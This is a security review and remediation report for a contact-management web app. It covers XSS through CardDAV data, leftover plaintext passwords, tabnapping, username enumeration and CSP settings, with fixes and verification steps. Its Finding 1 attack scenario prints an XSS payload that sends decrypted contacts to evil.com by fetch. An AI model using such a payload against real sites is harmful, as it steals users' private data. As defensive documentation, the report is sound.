# Security Review — Contact Management System
**Review date:** 2026-06-14  
**Remediation date:** 2026-06-15  
**Scope:** Client-side code, Userbase integration, CardDAV integration

---

## Status Summary (2026-06-15)

| Finding | Severity | Status | Verified |
|---|---|---|---|
| 1 — XSS via unescaped CardDAV data | Medium | ✅ Fixed | ✅ Console test passed |
| 2 — Legacy plaintext password in localStorage | Low–Medium | ✅ Fixed | ✅ Reload test passed |
| 3 — Missing `noopener noreferrer` | Low | ✅ Fixed | ✅ DOM query confirmed |
| 4 — Username enumeration via auth errors | Low | ✅ Was already handled | ✅ Logic test passed |
| 5 — `unsafe-inline` in `style-src` CSP | Low | ⏸ Deferred | — |

---

## Executive Summary

The application uses Userbase for end-to-end encrypted contact storage. Data **at rest** is well protected — Userbase encrypts everything before it leaves the browser. The primary risk surface is **after decryption**: crafted data from a malicious CardDAV server or a shared contact can reach DOM rendering code and trigger XSS. A strict Content Security Policy (CSP) significantly limits what an XSS exploit can actually do.

All medium and actionable low-severity findings have been remediated. One low-risk finding (Finding 5) is deferred pending a full inline-style audit.

---

## Architecture: What Is and Is Not Protected

| Data path | Protected? | How |
|---|---|---|
| Userbase contacts at rest | ✅ Yes | E2E encryption (AES-256 via Userbase SDK) |
| Userbase contacts in transit | ✅ Yes | TLS + E2E — Userbase server cannot read them |
| iCloud contacts in transit | ⚠️ Partial | TLS only — the Cloudflare Worker proxy sees plaintext |
| CardDAV credentials (new) | ✅ Yes | `SecureCredentialStorage` — PBKDF2 + AES-GCM |
| CardDAV credentials (legacy) | ✅ Fixed | Eager wipe of all `baikal_password_*` keys runs at startup (Finding 2 — remediated 2026-06-15) |
| Decrypted contact data in memory | ⚠️ No | All JS on the page can access it once decrypted |
| XSS exfiltration to attacker | ✅ Blocked | `connect-src` CSP prevents fetch to arbitrary domains |

---

## Findings

---

### FINDING 1 — XSS via Unescaped CardDAV Data (Medium Risk) — ✅ FIXED 2026-06-15

**File:** `src/integrations/SyncValidator.js` ~line 128  
**File:** `src/ui/BaikalUIController.js` ~line 1037

#### The Problem

`SyncValidator.js` builds a warning modal using `insertAdjacentHTML()` with a template literal. The `profile.addressbookUrl` value — which comes from a CardDAV server response during addressbook discovery — is **interpolated without escaping**:

```js
// SyncValidator.js — VULNERABLE
<code ...>${profile?.addressbookUrl || 'N/A'}</code>
```

Similarly, `renderSyncStatus()` in `BaikalUIController.js` injects connection data from the server into `innerHTML`:

```js
// BaikalUIController.js — potentially vulnerable depending on data source
syncStatusContainer.innerHTML = statusHTML;
```

#### Attack Scenario

1. Attacker runs a malicious CardDAV server.
2. User is social-engineered into adding it as a CardDAV profile (or an existing legitimate server is compromised).
3. During addressbook discovery, the server returns a crafted URL:
   ```
   /addressbooks/<img src=x onerror="fetch('https://evil.com?d='+btoa(JSON.stringify(window._contacts)))">
   ```
4. This string lands in `profile.addressbookUrl` and is injected into the DOM unescaped.
5. The `<img onerror>` fires — XSS achieved.

#### Why the CSP Limits Impact

Your `connect-src` policy:
```
connect-src 'self' https://carddav-proxy.data4-9de.workers.dev https://v1.userbase.com wss://v1.userbase.com;
```
blocks `fetch()` to `evil.com`. However, the attacker can still:
- Call `userbase.getDatabases()` and read all decrypted in-memory contacts
- Send data **to the allowed Cloudflare Worker** (which is your own proxy — less useful but worth noting)
- Redirect the user to a phishing page via `window.location`
- Read `localStorage` for any residual sensitive data

#### Fix

`SyncValidator.js` has no local `escapeHtml`. Add one (or import from `ContactUIHelpers`) and apply it:

```js
// Add at top of SyncValidator.js
function escapeHtml(str) {
    if (str == null) return '';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
}

// Then fix the template literal:
<code ...>${escapeHtml(profile?.addressbookUrl) || 'N/A'}</code>
```

For `renderSyncStatus()` in `BaikalUIController.js`, after audit all server-sourced values (`conn.connected`, `status.isConnected`, `status.connectionCount`) are booleans/integers — not raw strings. No change was needed there.

#### Resolution (2026-06-15)

- Added `escapeHtml()` function to `src/integrations/SyncValidator.js` (file previously had none)
- Applied to `profile?.addressbookUrl` at line 134
- **Verification:** Console test confirmed `<img src=x onerror=alert(1)>` renders as `&lt;img src=x onerror=alert(1)&gt;` — no execution

---

### FINDING 2 — Legacy Plaintext CardDAV Password in localStorage (Low–Medium Risk) — ✅ FIXED 2026-06-15

**File:** `src/ui/BaikalUIController.js` ~line 1628

#### The Problem

`getStoredPassword()` reads a legacy plaintext password from `localStorage` (key: `baikal_password_<profileName>`) and immediately erases it. This is a migration path from an older version. However:

1. **Old installations** that have not yet triggered this migration still have the password sitting in `localStorage` as plaintext.
2. **Any XSS** on the page (including from Finding 1) can read `localStorage` before this cleanup runs.

```js
getStoredPassword(profileName) {
    const key = `baikal_password_${profileName}`;
    const password = localStorage.getItem(key);  // plaintext read
    if (password) {
        localStorage.removeItem(key);  // cleanup only happens IF this method is called
    }
    return password;
}
```

The problem: `getStoredPassword()` is only called when the app initialises a connection. If an XSS fires before that (e.g., right after page load), the plaintext password is still present and readable.

#### Fix

Run the migration cleanup **eagerly on app startup**, not lazily on first connection. Add to the app initialisation sequence:

```js
// In ContactDatabase.js or app.js — run once at startup
function migrateLegacyPasswords() {
    const keysToRemove = Object.keys(localStorage)
        .filter(k => k.startsWith('baikal_password_'));
    keysToRemove.forEach(k => localStorage.removeItem(k));
}
```

This ensures plaintext passwords are gone from `localStorage` as fast as possible, narrowing the XSS window to zero for returning users.

#### Resolution (2026-06-15)

Added eager cleanup at the top of `initializeCoreModules()` in `src/app.js`:

```js
try {
    Object.keys(localStorage)
        .filter(k => k.startsWith('baikal_password_'))
        .forEach(k => localStorage.removeItem(k));
} catch (e) { /* private browsing — nothing to clean */ }
```

**Verification:** Planted `baikal_password_test` in localStorage, reloaded page — key was gone on next check. ✅

---

### FINDING 3 — Missing `rel="noopener noreferrer"` on External Links (Low Risk) — ✅ FIXED 2026-06-15

**File:** `index.html`

#### The Problem

Links that open in `target="_blank"` without `rel="noopener noreferrer"` allow the opened tab to access `window.opener`, enabling **reverse tabnapping**: the opened page can redirect your app's tab to a phishing page.

```html
<!-- index.html — VULNERABLE -->
<a href="https://appleid.apple.com/account/manage" target="_blank">appleid.apple.com</a>
<a href="https://github.com/tompatulpan/Contact-Manager" target="_blank">Source Code</a>
```

#### Fix

```html
<a href="https://appleid.apple.com/account/manage" target="_blank" rel="noopener noreferrer">appleid.apple.com</a>
<a href="https://github.com/tompatulpan/Contact-Manager" target="_blank" rel="noopener noreferrer">Source Code</a>
```

#### Resolution (2026-06-15)

Both links updated in `index.html`. **Verification:** `document.querySelectorAll('a[target="_blank"]')` confirmed both have `rel="noopener noreferrer"`. ✅

---

### FINDING 4 — Username Enumeration via Auth Error Messages (Low Risk) — ✅ ALREADY HANDLED (pre-existing)

**File:** `src/ui/ContactUIController.js` — `handleAuthError()` method

#### Finding

If Userbase returns distinguishable error messages for "user does not exist" vs "wrong password", the error display in `#auth-error` could reveal whether a username is registered.

#### Resolution

No code change needed. `ContactUIController.handleAuthError()` already maps both `UserNotFound` and `WrongPassword` SDK errors to the identical string `'Incorrect username or password.'` Additional protections already in place: exponential backoff on failed attempts (2^n seconds, capped at 5 min), persisted across page refreshes via `sessionStorage`.

**Verification:** Console logic test confirmed both error codes produce the same output. ✅

---

### FINDING 5 — `'unsafe-inline'` in `style-src` CSP (Low Risk) — ⏸ DEFERRED

**File:** `index.html`

#### The Problem

```
style-src 'self' https://cdnjs.cloudflare.com 'unsafe-inline';
```

`'unsafe-inline'` for styles allows CSS injection attacks. While CSS alone cannot directly steal data in modern browsers, it can be used for:
- UI redressing (making fake login overlays)
- Timing-based attribute exfiltration (CSS selector tricks)

#### Scope Assessment (2026-06-15)

~55 inline style instances across the codebase:
- 24 `style=""` attributes in `index.html`
- 31 `style=""` attributes in JS template literals (mainly `BaikalUIController.js` and `SyncValidator.js` modals)
- 7 `element.style.cssText` / `setAttribute('style', ...)` calls in JS

Note: `element.style.property = value` assignments in JS are **not** blocked by removing `unsafe-inline` — only `style=""` HTML attributes and `setAttribute('style', ...)` are affected.

#### Deferred Rationale

Practical security gain is low given that `script-src 'self'` already blocks any script injection. CSS-only data exfiltration requires exotic conditions with no practical path to contact data in this app. Estimated remediation effort: 2–4 hours of refactoring + visual regression testing.

#### Fix (when prioritised)

1. Move all `style=""` attributes in `index.html` to named CSS classes in existing stylesheets
2. Replace `setAttribute('style', ...)` calls with `classList.add/remove`
3. Replace JS template literal inline styles with CSS classes injected via `classList`
4. Remove `'unsafe-inline'` from `style-src` in the CSP header
5. Run full visual regression test across light/dark mode and mobile breakpoints

---

## What Is Done Well

- **`script-src 'self'`** — no external scripts, no `unsafe-inline`, no `unsafe-eval`. This is the most impactful CSP directive and it is strict.
- **SRI on Font Awesome and `userbase.js`** — CDN resources cannot be tampered with without breaking the integrity check.
- **`object-src 'none'`** — Flash and plugins completely disabled.
- **`base-uri 'self'`** — prevents base tag injection attacks.
- **`form-action 'self'`** — prevents form hijacking.
- **`escapeHtml()` in `BaikalUIController.js`** — a proper implementation exists and is used consistently in the profiles list renderer.
- **`escapeHtml()` in `ContactRenderer.js`** — contact data rendered from vCards is escaped throughout.
- **`SecureCredentialStorage`** — PBKDF2-SHA256 with 310,000 iterations (OWASP 2024 compliant), AES-GCM encryption. Solid implementation.
- **`getStoredPassword()` migration** — legacy plaintext passwords are now eagerly wiped at startup (Finding 2, fixed 2026-06-15).

---

## Priority Order for Fixes

| Priority | Finding | Effort |
|---|---|---|
| 1 | Finding 1 — Escape `profile.addressbookUrl` in `SyncValidator.js` | 5 min |
| 2 | Finding 2 — Eager `localStorage` plaintext password cleanup on startup | 15 min |
| 3 | Finding 3 — Add `rel="noopener noreferrer"` to all `target="_blank"` links | 5 min |
| 4 | Finding 4 — Normalise auth error messages | 10 min |
| 5 | Finding 5 — Reduce/eliminate `unsafe-inline` in `style-src` | 1–2 hours |
